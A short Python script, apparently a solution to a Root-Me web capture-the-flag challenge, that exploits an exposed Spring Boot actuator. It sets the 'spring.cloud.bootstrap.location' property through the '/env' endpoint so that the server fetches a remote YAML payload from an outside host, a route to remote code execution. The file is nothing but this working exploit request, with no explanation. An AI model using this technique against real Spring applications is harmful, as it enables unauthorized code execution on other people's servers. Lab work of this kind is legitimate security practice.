import requests

url = "http://challenge01.root-me.org/web-serveur/ch46/env"
url2 = "http://challenge01.root-me.org/web-serveur/ch46/env" 
x = requests.get(url,params={"spring.cloud.bootstrap.location":"http://artsploit.com/yaml-payload.yml"})

print(x.text)